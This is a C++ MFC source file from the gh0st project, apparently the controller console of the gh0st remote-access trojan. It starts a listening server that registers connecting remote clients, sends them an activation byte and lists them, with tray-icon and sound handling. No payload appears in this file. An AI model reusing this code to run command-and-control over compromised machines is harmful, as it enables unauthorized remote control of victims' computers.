
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include <mmsystem.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame
CIOCPServer* g_iocpServer = NULL;   //全局的IOCP指针
Cgh0stView*  g_gh0stView = NULL;


IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

const int  iMaxUserToolbars = 10;
const UINT uiFirstUserToolBarId = AFX_IDW_CONTROLBAR_FIRST + 40;
const UINT uiLastUserToolBarId = uiFirstUserToolBarId + iMaxUserToolbars - 1;

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()

	ON_MESSAGE(WM_ICON_NOTIFY,OnTrayNotification)

	ON_COMMAND(IDM_SHOW, &CMainFrame::OnShow)
	ON_COMMAND(IDM_HIDE, &CMainFrame::OnHide)
	ON_COMMAND(IDM_QUIT, &CMainFrame::OnQuit)
	ON_WM_CLOSE()
	ON_WM_TIMER()
END_MESSAGE_MAP()

//指示器
static UINT indicators[] =  
{
    ID_STATUSTIP,           // 本机IP地址
    ID_STATUSSPEED,         // 速度
    ID_STATUSPORT,          // 端口
    ID_STATUSCOUNT          // 数量
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame()
{
	// TODO: 在此添加成员初始化代码
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	if (!m_wndStatusBar.Create(this))
	{
		TRACE0("未能创建状态栏\n");
		return -1;      // 未能创建
	}

	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT));

    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
    m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	// TODO: 如果不需要可停靠工具栏，则删除这三行
    if (!m_wndTab.Create(WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
        CRect(0, 0, 0, 15), this, IDC_TABCTRL)
        )
    {
        TRACE0("Failed to create tab control\n");
        return -1;
    }

    m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS), NULL);

    m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	EnableDocking(CBRS_ALIGN_ANY);

	SetTimer(8888, 800,NULL);

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: 在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式
    cs.style &= ~FWS_ADDTOTITLE;   //把原有的窗体标题去掉
    cs.lpszName = "验证服务器";    //修改了窗体的标题

    cs.cx = 646;
    cs.cy = 310;

	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
    CString str;
    //一般情况不会发生
    if (g_iocpServer)
    {
        g_iocpServer->Shutdown();
        delete g_iocpServer;
        g_iocpServer = NULL;
    }

    g_iocpServer = new CIOCPServer();
    if (g_iocpServer->Initialize(NotifyProc, this, nMaxConnections, nPort))
    {
        //启动服务器成功了
        str.Format("端口:%d", nPort);
        m_wndStatusBar.SetPaneText(2, str);
    }

}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
    //
    try
    {
        CMainFrame* pFrame = (CMainFrame*)lpParam;
		BYTE bData;   //定义1字节封包（专门用来激活）
        // 对g_pConnectView 进行初始化
         g_gh0stView = (Cgh0stView*)((Cgh0stApp *)AfxGetApp())->m_gh0stView;

        switch (nCode)
        {
        case NC_CLIENT_CONNECT:     //客户端连接
			bData = COMMAND_ACTIVED;
			g_iocpServer->Send(pContext, &bData, 1);  //通过服务iocp发送给那个连接过来的客户一个激活功能  为了留住客户端
            break;
        case NC_CLIENT_DISCONNECT:  //客户端断开
			{
			if (((Cgh0stApp*)AfxGetApp())->m_bSound)
			{
				CString strBuf;

				strBuf.Format("%s\\Offline.wav", ((Cgh0stApp *)AfxGetApp())->m_AppPath);
				sndPlaySound(strBuf, SND_ASYNC);   //异步的播放声音
			}
				g_gh0stView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			}
			
            break;
        case NC_TRANSMIT:           //发送文件
            break;
        case NC_RECEIVE:            //接受文件
            //ProcessReceive(pContext);
            break;
        case NC_RECEIVE_COMPLETE:   //接收完成
            ProcessReceiveComplete(pContext);
            break;
        }
    }
    catch (...) 
    {
    }
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)  //上下文指针（也就是客户端）
{
    CString strBuf;

    switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
    {
        case TOKEN_LOGIN: //登陆信息过来了
        {
			CString strBuf;
			if (((Cgh0stApp*)AfxGetApp())->m_bSound)
			{
				if (((Cgh0stApp*)AfxGetApp())->m_strSoundFile.IsEmpty())
				{
					strBuf.Format("%s\\Login.wav", ((Cgh0stApp *)AfxGetApp())->m_AppPath);
				}
				else
				{
					strBuf = (((Cgh0stApp *)AfxGetApp())->m_strSoundFile);
				}	
				sndPlaySound(strBuf, SND_ASYNC);   //异步的播放声音
			}
			
            g_gh0stView->PostMessage(WM_ADDTOLIST, NULL, (LPARAM)pContext);
        }
        break;
        // 命令停止当前操作
        default:
            closesocket(pContext->m_Socket);
            break;
    }
}



void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (nID == SC_MINIMIZE)  //最小化
	{
		if (!m_TrayIcon.Enabled())  //如果没有创建托盘图标则创建（第一次创建，创建完就不会再创建了）
		{
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, "正在托盘运行.....",
				AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE);  //构造
		}
		ShowWindow(SW_HIDE);//隐藏窗体
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}

	
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)  //双击
	{
		ShowWindow(SW_SHOW);
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
}


void CMainFrame::OnHide()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_HIDE);
}


void CMainFrame::OnQuit()
{
	// TODO: 在此添加命令处理程序代码
	OnClose();
}


void CMainFrame::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_TrayIcon.RemoveIcon();

	g_iocpServer->Shutdown();    //关闭完成端口服务器

	delete g_iocpServer;

	CFrameWnd::OnClose();
}


void CMainFrame::OnTimer(UINT_PTR nIDEvent)  //只在UI线程中工作
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	static int nShow = 0;

	switch (nIDEvent)
	{
	case 8888:
		{
			if (nShow == 0)
			{
				m_TrayIcon.SetIcon(IDI_ICON1);
				nShow = 1;
			}
			else
			{
				m_TrayIcon.SetIcon(IDR_MAINFRAME);
				nShow = 0;
			}

		}
		break;
	}
	
	CFrameWnd::OnTimer(nIDEvent);
}
